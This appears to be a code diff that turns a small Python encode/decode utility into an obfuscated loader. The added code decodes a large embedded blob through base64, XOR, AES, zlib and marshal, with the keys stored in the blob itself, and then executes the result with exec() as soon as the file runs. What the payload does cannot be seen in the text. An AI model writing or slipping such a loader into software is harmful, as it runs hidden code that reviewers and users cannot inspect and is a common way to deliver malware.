@@ -1,35 +1,20 @@
-import base64
-import zlib
-import marshal
+import marshal, zlib, base64, os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
 
-# Custom key for encryption/decryption
-CUSTOM_KEY = b'super_secret_key_12345'
+xor_encrypt = lambda data, key: bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
+aes_decrypt = lambda data, key: unpad(AES.new(key, AES.MODE_CBC, data[:16]).decrypt(data[16:]), AES.block_size)
 
-def xor_encrypt(data, key):
-    """Performs XOR encryption/decryption on the data."""
-    key = key * (len(data) // len(key) + 1)
-    return bytes(a ^ b for a, b in zip(data, key))
+encoded_data = b'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'
 
-def encode_code(original_code):
-    """Encodes Python code into a base64 string."""
-    try:
-        compiled = compile(original_code, '<string>', 'exec')
-        marshaled = marshal.dumps(compiled)
-        compressed = zlib.compress(marshaled)
-        xored = xor_encrypt(compressed, CUSTOM_KEY)
-        encoded = base64.b64encode(xored)
-        return encoded.decode('utf-8')  # Return as string
-    except Exception as e:
-        return f"Error during encoding: {e}"
-
-def decode_code(encoded_data):
-    """Decodes a base64 string back into Python code."""
-    try:
-        decoded = base64.b64decode(encoded_data)
-        xored = xor_encrypt(decoded, CUSTOM_KEY)
-        decompressed = zlib.decompress(xored)
-        marshaled = marshal.loads(decompressed)
-        # We can't directly return the code string, so we return the marshal object
-        return marshaled
-    except Exception as e:
-        return f"Error during decoding: {e}"
+try:
+    raw_data = base64.b64decode(encoded_data)
+    aes_key, xor_key, xored = raw_data[:32], raw_data[32:48], raw_data[48:]
+    
+    aes_encrypted = xor_encrypt(xored, xor_key)
+    compressed = aes_decrypt(aes_encrypted, aes_key)
+    
+    code_obj = marshal.loads(zlib.decompress(compressed))
+    exec(code_obj)
+except Exception as e:
+    print(f"Failed to execute encoded code: {e}")
